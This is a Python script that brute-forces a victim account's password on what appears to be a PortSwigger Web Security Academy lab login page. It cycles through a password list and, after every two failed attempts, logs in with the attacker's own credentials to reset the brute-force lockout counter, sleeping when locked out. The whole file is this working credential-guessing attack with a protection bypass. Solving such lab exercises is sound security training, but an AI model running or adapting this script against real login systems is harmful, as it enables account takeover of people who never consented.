import requests
import os
import time

def getPasswordList(file):
    password_list = []
    with open(file, "r") as pass_file:
        for line in pass_file:
            password_list.append(line.rstrip())
    return password_list

def makeRequest(url, path, post_data=None):
    response = requests.request(
    "POST",
    f"{url}{path}",
    data=post_data
    )
    return response

def bruteForcePassword(url, path, password_list, attacker_user, attacker_pass, victim_user):
    ATTACKER_CREDS = {"username": {attacker_user}, "password": {attacker_pass}} 
    COUNT = 0
    for password in password_list:
        if COUNT == 2:
            _res = makeRequest(url, path, post_data=ATTACKER_CREDS)
            print(f"Count: {COUNT}")
            print(f"Login with Attacker: {attacker_user}")
            print(f"Status: {_res.status_code}")
            COUNT = 0
        res = makeRequest(url, path, post_data={"username": {victim_user}, "password": {password}})
        print(f"Count: {COUNT}")
        print(f"Trying Password: {password}")
        print(f"Status: {res.status_code}")
        if "Incorrect password" in res.text:
            COUNT += 1
        if "too many incorrect" in res.text:
           print(f"Password: {password}\nError: too many incorrect attempts")
           print(f"Sleeping for 60 seconds")
           time.sleep(60)
        if "Log out" in res.text:
            return f"*** FOUND PASSWORD: {password} ***"


if __name__ == '__main__':
    URL = "https://0a5800dd044e9b718343a0ee00030008.web-security-academy.net/"
    PATH = "login"
    ATTACKER_USER = "wiener"
    ATTACKER_PASS = "peter"
    VICTIM_USER = "carlos"
    CWD = os.getcwd()
    
    pass_list = getPasswordList(f'{CWD}/Authentication/passwords.txt')
    password = bruteForcePassword(
        URL,
        PATH,
        pass_list,
        ATTACKER_USER,
        ATTACKER_PASS,
        VICTIM_USER
    )

    print(password)
